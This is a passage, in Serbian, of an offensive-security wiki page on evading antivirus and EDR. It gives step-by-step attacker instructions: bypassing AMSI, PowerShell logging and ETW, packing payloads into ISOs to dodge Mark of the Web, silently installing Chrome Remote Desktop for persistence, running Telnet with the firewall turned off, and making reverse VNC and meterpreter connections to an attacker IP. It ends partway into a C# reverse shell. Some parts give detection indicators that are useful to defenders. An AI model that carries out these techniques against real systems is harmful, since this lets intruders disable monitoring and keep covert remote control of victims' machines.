Možete koristiti alat kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da biste uklonili otkriveni AMSI potpis iz memorije trenutnog procesa. Ovaj alat skenira memoriju trenutnog procesa u potrazi za AMSI potpisom i zatim ga prepisuje NOP instrukcijama, čime ga efektivno uklanja iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Listu AV/EDR proizvoda koji koriste AMSI možete pronaći na **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite PowerShell verziju 2**
Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati skripte bez AMSI skeniranja. To možete uraditi ovako:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging je funkcija koja omogućava beleženje svih PowerShell komandi izvršenih na sistemu. Ovo može biti korisno za potrebe revizije i rešavanja problema, ali može predstavljati i **problem za napadače koji žele da izbegnu otkrivanje**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Onemogućite PowerShell Transcription i Module Logging**: U tu svrhu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Koristite PowerShell verziju 2**: Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati skripte bez AMSI skeniranja. To možete uraditi ovako: `powershell.exe -version 2`
- **Koristite unmanaged PowerShell sesiju**: Koristite [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da biste hostovali PowerShell bez pokretanja `powershell.exe` (pristup koji koristi `powerpick` u Cobalt Strike-u). Ovo zaobilazi kontrole koje su vezane konkretno za proces `powershell.exe`, ali samo po sebi ne onemogućava AMSI, Script Block Logging niti druge PowerShell odbrane; obuhvat zavisi od runtime-a i implementacije hosta.


## Obfuskacija

> [!TIP]
> Nekoliko tehnika obfuskacije oslanja se na šifrovanje podataka, što povećava entropiju binarne datoteke i olakšava AV alatima i EDR-ovima da je otkriju. Budite oprezni i možda primenite šifrovanje samo na određene delove koda koji su osetljivi ili ih treba sakriti.

### Deobfuskacija .NET binarnih datoteka zaštićenih pomoću ConfuserEx

Pri analizi malware-a koji koristi ConfuserEx 2 (ili komercijalne fork-ove) često se nailazi na nekoliko slojeva zaštite koji blokiraju dekompilatore i sandbox okruženja. Tok rada u nastavku pouzdano **vraća IL koji je gotovo identičan originalu**, a koji se zatim može dekompilovati u C# pomoću alata kao što su dnSpy ili ILSpy.<sup>[[10]](#references)</sup>

1.  Uklanjanje zaštite od neovlašćenih izmena – ConfuserEx šifruje svako *telo metode* i dešifruje ga unutar statičkog konstruktora *modula* (`<Module>.cctor`). Takođe menja PE checksum, pa će svaka izmena izazvati pad binarne datoteke. Koristite **AntiTamperKiller** da biste pronašli šifrovane tabele metapodataka, obnovili XOR ključeve i prepisali čistu assembly datoteku:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri pravljenju sopstvenog unpacker-a.

2.  Oporavak simbola / toka kontrole – prosledite *čistu* datoteku alatu **de4dot-cex** (fork alata de4dot prilagođen za ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Zastavice:
     • `-p crx` – izaberite ConfuserEx 2 profil
     • de4dot će poništiti spljoštavanje toka kontrole, vratiti izvorne prostore imena, klase i nazive promenljivih i dešifrovati konstantne stringove.

3.  Uklanjanje proxy poziva – ConfuserEx zamenjuje direktne pozive metoda laganim omotačima (poznatim i kao *proxy calls*) kako bi dodatno otežao dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nakon ovog koraka trebalo bi da vidite uobičajene .NET API-je, kao što su `Convert.FromBase64String` ili `AES.Create()`, umesto neprozirnih funkcija-omotača (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite rezultujući binarni fajl u dnSpy-ju i potražite velike Base64 blobove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da biste pronašli *stvarni* payload.  Malware ga često čuva kao TLV-kodirani niz bajtova inicijalizovan unutar `<Module>.byte_0`.

Ovaj niz koraka obnavlja tok izvršavanja **bez** pokretanja zlonamernog uzorka – korisno pri radu na offline radnoj stanici.

> 🛈  ConfuserEx generiše prilagođeni atribut pod nazivom `ConfusedByAttribute`, koji se može koristiti kao IOC za automatsku trijažu uzoraka.

#### Jednolinijska komanda
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuskator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi fork LLVM kompilacionog paketa otvorenog koda koji pruža veću bezbednost softvera putem [obfuskacije koda](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštite od neovlašćenih izmena.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje kako se jezik `C++11/14` može koristiti za generisanje obfuskovanog koda tokom kompilacije, bez korišćenja spoljnog alata i bez izmene kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuskovanih operacija generisanih C++ template metaprogramiranjem, što malo otežava posao osobi koja želi da razbije aplikaciju.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 obfuskator binarnih datoteka koji može da obfuskuje različite PE datoteke, uključujući .exe, .dll i .sys.
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan mehanizam za metamorfni kod namenjen proizvoljnim izvršnim datotekama.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je okvir za fino-grainovanu obfuskaciju koda za jezike koje podržava LLVM, a koristi ROP (programiranje orijentisano na povratak). ROPfuscator obfuskuje program na nivou asemblerskog koda tako što regularne instrukcije pretvara u ROP lance, čime narušava uobičajenu predstavu o normalnom toku kontrole.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim-u.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeće EXE/DLL datoteke u shellcode, a zatim da ih učita.

### LLVM kompilatorom potpomognuto samomaskiranje po funkciji

Umesto da maskira ceo implant samo dok miruje, izmenjeni LLVM X86 backend može da XOR-maskira odabrane funkcije kad god nisu aktivne. PoC Function Peekaboo bira demanglovana imena koja sadrže `REG_`, ubacuje pozicione nezavisne ulazne i izlazne stubove oko konačnog mašinskog koda i emituje jedan zajednički handler za maskiranje u `.text`; potpisi na nivou izvornog koda i Windows x64 konvencija pozivanja ostaju nepromenjeni.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformacija toka kontrole u backend-u

Ova transformacija treba da se obavi nakon odabira instrukcija i optimizacije, jer mora da obuhvati **svaki emitovani povratak** i da zna tačan x86 raspored. `MachineFunctionPass` koji se izvršava pre emitovanja pronalazi poslednji `MachineInstr::isReturn()`, briše ga tako da poslednja putanja nastavlja izvršavanje u naknadno dodatni epilog, a ranije povratke zamenjuje instrukcijom `JMP_1 handler`. Zadržite sve čišćenje steka/okvira koje je kompajler generisao pre svakog povratka; preusmerite samo samu instrukciju povratka.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `X86AsmPrinter::emitFunctionBodyEnd()` emituju stubove za svaku funkciju, dok `emitEndOfAsmFile()` emituje handler. Simboli koji se dele između faza emitovanja omogućavaju da grana iz prologa cilja epilog koji se emituje kasnije; za ručno emitovani near `je`, upišite `0F 84`, a zatim četvorobajtni MC izraz `target - address_after_je`. Pozivi i skokovi do handlera mogu se umesto toga emitovati kao `MCInst` objekti (`CALL64pcrel32` i `JMP_1`). Pass mora da vrati `false` za funkciju koja nije izabrana, ako ništa nije promenio; PoC pogrešno vraća `true` u tom slučaju.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metapodaci i inicijalizacija pre CRT-a

PoC smešta XOR ključ i zapise od 16 bajtova, koji sadrže pokazivač na funkciju na koji je loader primenio relokaciju, kao i dužinu tokom izvršavanja, u `.funcmeta`. Iako je C polje `uint32_t`, handler pristupa QWORD-u na pomeraju `+8` u zapisu, čime čita dužinu i njeno dopunsko popunjavanje, a zapise obrađuje u koracima od `0x10`. Imena PE sekcija zauzimaju samo osam bajtova, pa pretraga tokom izvršavanja prepoznaje `.funcmet`. Spoljni patcher dodaje izvršnu sekciju `.stub`, čuva stari RVA ulazne tačke u stubu i preusmerava `AddressOfEntryPoint`; PIC stub dobija bazu slike preko `gs:[0x60]` → `[PEB+0x10]`, prolazi kroz PE32+ import-e da bi razrešio već uvezeni `VirtualProtect` i izvršava se pre CRT-a.<sup>[[38]](#references)[[39]](#references)</sup>

Inicijalizacija postavlja sentinel u `gs:[0xE8]` i poziva svaku funkciju iz metapodataka. Njен trajno čitljiv prolog beleži početak funkcije u `gs:[0xF0]`, detektuje sentinel i preskače telo koje još nije maskirano. Epilog zatim koristi `call handler`; nakon što handler sačuva 13 registara (`0x68` bajtova), povratna adresa na `[rsp+0x68]` predstavlja kraj transformisane funkcije, pa se `end - start` može upisati u njen zapis metapodataka. Stub briše sentinel i skače na `ImageBase + original_entry_point_RVA` nakon što su sva tela maskirana.<sup>[[38]](#references)[[39]](#references)</sup>

Tokom normalnog poziva, prolog poziva isti simetrični handler da dekodira telo. Poslednja putanja nastavlja izvršavanje u naknadno dodatni epilog, dok svaki raniji povratak skače pravo do zajedničkog handlera. Normalni epilog takođe koristi `jmp handler`, a ne `call`, pa nakon ponovnog maskiranja instrukcija `ret` u handleru troši povratnu adresu prvobitnog pozivaoca i čuva rezultat funkcije u `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitiva za maskiranje i indikatori analize

Handler pronalazi trenutni zapis, preskače fiksni vidljivi prolog (u ovoj verziji dugačak `0x46` bajtova), menja zaštitu ostatka u `PAGE_EXECUTE_READWRITE`, XOR-uje svaki bajt najnižim bajtom ključa, a zatim postavlja zaštitu na `PAGE_EXECUTE_READ`. Ista petlja tako dekodira pri ulasku i kodira pri svakom normalnom izlasku.<sup>[[38]](#references)[[39]](#references)</sup>

Indikatori visoke pouzdanosti za ovaj dizajn obuhvataju:<sup>[[38]](#references)[[39]](#references)</sup>

- ulaznu tačku unutar izvršne sekcije `.stub` i sekciju `.funcmet` koja sadrži ključ i relokovane pokazivače u `.text`;
- parsiranje PEB-a, tabele import-a i tabele sekcija pre CRT-a, nakon čega slede pozivi preko svakog pokazivača iz metapodataka;
- identične PIC prologe `call`/`pop` i brojne lokacije povratka preusmerene ka jednom handleru;
- upise u `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, praćene ponovljenim promenama zaštite preko `VirtualProtect` i XOR upisima bajt po bajt u izvršne stranice mapirane iz slike.

Ovo služi za izbegavanje memorijskih skenera, a ne za kriptografsku zaštitu: zakrpljena datoteka i dalje sadrži originalno, nemaskirano telo, a debugger može da postavi breakpoint na `VirtualProtect` ili XOR petlju i sačuva aktivnu funkciju. Jednobajtni XOR, čitljivi metapodaci i fiksna granica `0x46` takođe čine oporavak van mreže jednostavnim.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slotovi u PoC-u specifični su za nit, ali izmenjene stranice koda važe za ceo proces. Zbog toga konkurentni ili rekurzivni ulasci mogu ponovo da promene instrukcije dok se druga instanca izvršava; izuzeci i nenormalni izlazi takođe mogu da zaobiđu ponovno maskiranje. Robusna implementacija mora da sinhronizuje promene, vrati zaštitu koja je stvarno dobijena preko `lpflOldProtect`, izbegne hardkodirane dužine stubova, proveri i `call` i `jmp` putanje u pogledu poravnanja steka na x64 i pozove `FlushInstructionCache` nakon ponovnog upisivanja izvršnih bajtova. Microsoft izričito prepušta pozivaocu odgovornost za koherentnost keša instrukcija kada se izvršni kod menja.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih izvršnih datoteka sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno zlonamernih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen se uglavnom oslanja na reputaciju, što znači da će aplikacije koje se retko preuzimaju pokrenuti SmartScreen, koji će upozoriti krajnjeg korisnika i sprečiti pokretanje datoteke (iako se datoteka i dalje može pokrenuti klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) pod nazivom Zone.Identifier, koji se automatski kreira prilikom preuzimanja datoteka sa interneta, zajedno sa URL-om sa kog je datoteka preuzeta.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS-a za datoteku preuzetu sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršne datoteke potpisane **pouzdanim** sertifikatom za potpisivanje **neće pokrenuti SmartScreen**.

Veoma efikasan način da sprečite da vaši payload-i dobiju Mark of The Web jeste da ih zapakujete u neku vrstu kontejnera, na primer ISO. To je zato što Mark-of-the-Web (MOTW) **ne može** da se primeni na **non-NTFS** volumene.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload-e u izlazne kontejnere kako bi izbegao Mark-of-the-Web.

Primer upotrebe:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Evo demonstracije za zaobilaženje SmartScreen-a pakovanjem payload-a u ISO datoteke pomoću [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za beleženje događaja u Windows-u koji aplikacijama i sistemskim komponentama omogućava da **beleže događaje**. Međutim, bezbednosni proizvodi mogu da ga koriste i za nadzor i otkrivanje zlonamernih aktivnosti.

Slično kao što se AMSI onemogućava (zaobilazi), moguće je i učiniti da funkcija **`EtwEventWrite`** procesa u korisničkom prostoru odmah vrati kontrolu, a da ne zabeleži nijedan događaj. To se postiže izmenom funkcije u memoriji tako da odmah vrati kontrolu, čime se efektivno onemogućava ETW beleženje za taj proces.

Više informacija možete pronaći na **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Refleksija C# sklopova

Učitavanje C# binarnih datoteka u memoriju poznato je već duže vreme i i dalje je odličan način za pokretanje post-exploitation alata bez otkrivanja od strane AV-a.

Pošto će se payload učitati direktno u memoriju, bez upisivanja na disk, moraćemo samo da vodimo računa o izmeni AMSI-ja za ceo proces.

Većina C2 okvira (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) već omogućava izvršavanje C# sklopova direktno u memoriji, ali postoje različiti načini za to:

- **Fork\&Run**

Ovaj metod podrazumeva **pokretanje novog žrtvenog procesa**, ubacivanje zlonamernog post-exploitation koda u taj novi proces, njegovo izvršavanje i prekid novog procesa po završetku. Ovaj metod ima i prednosti i nedostatke. Prednost metode fork and run je ta što se izvršavanje odvija **izvan** процеса нашег Beacon implant-а. То значи да постоји **много већа вероватноћа** да ће наш **implant преживети** ако нешто пође наопако током post-exploitation активности или буде откривено. Недостатак је **већа вероватноћа** да ће вас открити **детекције засноване на понашању**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Реч је о убацивању злонамерног post-exploitation кода **у сопствени процес**. Тако можете да избегнете креирање новог процеса и његово скенирање од стране AV-а, али недостатак је што постоји **много већа вероватноћа** да ћете **изгубити свој beacon** ако нешто пође наопако током извршавања payload-а, јер процес може да се сруши.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ако желите да прочитате више о учитавању C# склопова, погледајте овај чланак [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) и њихов InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# склопове можете да учитате и **из PowerShell-а**; погледајте [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) и [видео S3cur3th1sSh1t-а](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Препаковање .NET алата у WebAssembly помоћу NativeAOT-а (WasmForge)

Уобичајене технике `execute-assembly` задржавају препознатљив MSIL и на крају иницијализују CLR. **WasmForge** уместо тога мења окружење за извршавање: мигрира C# пројекат на експериментални NativeAOT-LLVM WASI циљ, унапред га компајлира у WebAssembly и уграђује тај модул у Windows PE хост заснован на Wazero-у. Добијеном процесу нису потребни CLR, JIT ни `dotnet` хост на циљном систему, па правила заснована само на називима управљаних склопова, учитавању CLR-а, AMSI-ју или .NET ETW-у немају непосредан увид у њега. Ово је техника за избегавање откривања/паковање, а не заобилажење границе привилегија — гостујући програм задржава дозволе и уочљиво понашање оригиналног алата у оперативном систему.<sup>[[44]](#references)[[45]](#references)</sup>

### Изградња C# пројекта

Препоручује се изградња у Docker окружењу пројекта, јер оно садржи .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker и зависности за потписивање. `.csproj` датотека се аутоматски открива; једнократна изградња обавља миграцију, исправке компатибилности, компајлирање у WASM, креирање PE датотеке и потписивање.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Radi rešavanja problema ili pregleda generisanog koda, podelite proces na `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` i završni `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Slika za build takođe koristi omotač `wasm-component-ld` da bi izbegla kodiranje WASI Preview 2 komponente i proizvela običan modul koji očekuje ugrađeno izvršno okruženje.<sup>[[44]](#references)[[45]](#references)</sup>

### Povezivanje wasm32 C# koda sa x64 Win32

Ovo nije transparentno ponovno prevođenje. NativeAOT-WASI nema neke funkcije BCL-a namenjene Windowsu ili ih menja, a wasm32 gost obično dodeljuje četvorobajtne slotove pokazivačima, dok x64 API-ji mogu da vrate osmobajtne pokazivače. WasmForge rešava oba problema pomoću sledećih generisanih slojeva:<sup>[[44]](#references)</sup>

1. Source patcher ispravlja semantičke razlike specifične za AOT i preusmerava nepodržane pozive registru, pipe-ovima, WMI-ju, identitetu, direktorijumskim servisima, verziji datoteke, LSA-u i sličnim funkcijama na pomoćne funkcije `Wf*`.
2. P/Invoke skener generiše NativeAOT `DirectPInvoke` mapiranja, tako da se pozivi `[DllImport]` povezuju sa povezanim C bridge simbolima, umesto da dinamički učitavaju deklarisanu DLL datoteku unutar gosta.
3. Pokazivači vezani za host koriste `ulong` u C#-u i `uint64_t` u C-u. Generički dispečer prosleđuje poziv Win32 handler-u hosta; `out8_mask` označava stvarne osmobajtne izlazne slotove čije gornje polovine treba sačuvati. Za neoznačene izlaze oblika wasm32 koristi se zaštita snimkom i vraćanjem, kako upis x64 sistema ne bi oštetio susedna četiri bajta.
4. Namenski host bridge-ovi obrađuju operacije koje ne odgovaraju generičkom syscall dispečiranju, kao što su pristup LSA kešu tiketa, Kerberos/BCrypt operacije sa strukturisanim rezultatima, TCP KDC saobraćaj i LDAP upiti.

Na primer, omotač za `version.dll!VerQueryValueW` prosleđuje četiri host adrese i postavlja bitove 2 i 3 (`0xC`), jer su pokazivač na vrednost i dužina osmobajtni izlazni slotovi. Sam omotač ostaje generički i prosleđuje naziv DLL-a, naziv izvozne funkcije, argumente i masku funkciji `wf_call_v2`; host obavlja prevođenje pokazivača i poziva nativni API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Ograničenja i pravci detekcije

Kod sa mnogo reflection-a, dinamičko učitavanje assembly-ja, proizvoljni native callback-ovi i složene x64 strukture koje se vraćaju u WASM memoriju i dalje mogu zahtevati zakrpe za pojedinačne alate ili potpuno otkazati. Generički WASI Preview 2 sockets takođe mogu dospeti do no-op stub-ova, pa podržani alati koriste host shim-ove specifične za protokol. Proverite svaku komandu u odnosu na native build umesto da pretpostavljate da su funkcije iste.<sup>[[44]](#references)[[45]](#references)</sup>

Ova tehnika preusmerava telemetriju, umesto da payload učini nevidljivim. Detekcija može da se usmeri na PE koji sadrži WASM modul ili ga materijalizuje, ponašanje runtime-a nalik Wazero-u, neuobičajeno dodeljivanje i kopiranje host/guest memorije, generičko direktno slanje Win32 poziva, anomalije u potpisivanju i PE resursima, kao i na rezultujuće API pozive i mrežni saobraćaj. Zato odsustvo CLR-load, AMSI ili .NET ETW događaja ne treba smatrati dokazom da je proces bezopasan.<sup>[[44]](#references)</sup>

## Korišćenje drugih programskih jezika

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati maliciozni kod korišćenjem drugih jezika tako što se kompromitovanoj mašini omogući pristup **okruženju interpreter-a instaliranom na SMB deljenom resursu koji kontroliše napadač**.

Omogućavanjem pristupa interpreter binarnim datotekama i okruženju na SMB deljenom resursu možete **izvršavati proizvoljan kod napisan tim jezicima u memoriji** kompromitovane mašine.

U repozitorijumu se navodi: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti za zaobilaženje statičkih potpisa**. Testiranje nasumičnih, zamagljivanje neizmenjenih reverse shell skripti napisanih na ovim jezicima pokazalo se uspešnim.

## Ponovno hostovanje WebAssembly-a radi izbegavanja statičke analize

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping menja access token bezbednosnog proizvoda kao što su EDR ili AV. Smanjenje privilegija token-a može ostaviti proces pokrenutim, a istovremeno ga sprečiti da obavlja privilegovane radnje inspekcije ili otklanjanja pretnji.

Da bi se to sprečilo, Windows bi mogao da **spreči spoljne procese** da dobiju handles za tokene bezbednosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Korišćenje pouzdanog softvera

### Chrome Remote Desktop

Kao što je opisano u [**ovom blog postu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je jednostavno instalirati Chrome Remote Desktop na računar žrtve, a zatim ga preuzeti i održavati postojanost:<sup>[[35]](#references)</sup>
1. Preuzmite sa https://remotedesktop.google.com/, kliknite na "Set up via SSH", a zatim kliknite na MSI datoteku za Windows da biste je preuzeli.
2. Tiho pokrenite instalacioni program na računaru žrtve (potrebna su administratorska prava): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop i kliknite na next. Čarobnjak će zatim zatražiti autorizaciju; kliknite na dugme Authorize da biste nastavili.
4. Izvršite navedenu komandu uz potrebne izmene: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametar `--pin` postavlja PIN bez korišćenja GUI-ja).
 

## Napredno izbegavanje detekcije

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Izbegavanje detekcije je veoma složena tema; ponekad morate uzeti u obzir mnogo različitih izvora telemetrije u jednom sistemu, tako da je gotovo nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje na koje naiđete imaće svoje prednosti i slabosti.

Toplo preporučujem da pogledate ovo predavanje od [@ATTL4S](https://twitter.com/DaniLJ94) kako biste stekli osnovno znanje o naprednijim tehnikama izbegavanja detekcije.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je još jedno odlično predavanje od [@mariuszbit](https://twitter.com/mariuszbit) o dubinskom izbegavanju detekcije.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare tehnike**

### **Provera koje delove Defender prepoznaje kao maliciozne**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), koji će **uklanjati delove binarne datoteke** dok **ne utvrdi koji deo Defender prepoznaje** kao maliciozan i izdvojiti ga za vas.\
Još jedan alat koji radi **istu stvar je** [**avred**](https://github.com/dobin/avred), uz javno dostupan web servis na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, svi Windows sistemi imali su **Telnet server** koji ste mogli da instalirate (kao administrator) ovako:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Podesite da se **pokrene** pri pokretanju sistema i **pokrenite** ga sada:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Promenite telnet port** (stealth) **i onemogućite firewall:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrebna su vam binarna preuzimanja, a ne instalacioni program)

**NA HOSTU**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim premestite binarnu datoteku _**winvnc.exe**_ i **novonapravljenu** datoteku _**UltraVNC.ini**_ na **žrtvin** računar

#### **Obrnuta veza**

**Napadač** treba **da pokrene na svom** **hostu** binarnu datoteku `vncviewer.exe -listen 5900` kako bi bila **spremna** da prihvati obrnutu **VNC vezu**. Zatim na **žrtvinom** računaru pokrenite winvnc daemon komandom `winvnc.exe -run`, pa pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste ostali neprimećeni, nemojte raditi sledeće:

- Nemojte pokretati `winvnc` ako je već pokrenut jer ćete izazvati [iskačući prozor](https://i.imgur.com/1SROTTl.png). Proverite da li je pokrenut komandom `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez datoteke `UltraVNC.ini` u istom direktorijumu jer će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
- Nemojte pokretati `winvnc -h` radi pomoći jer ćete izazvati [iskačući prozor](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Unutar GreatSCT-a:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sada **pokrenite listener** pomoću `msfconsole -r file.rc` i **izvršite** **XML payload** pomoću:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Trenutni Defender će veoma brzo prekinuti proces.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# reverse shell

Kompajlirajte ga pomoću:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Koristite ga uz:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
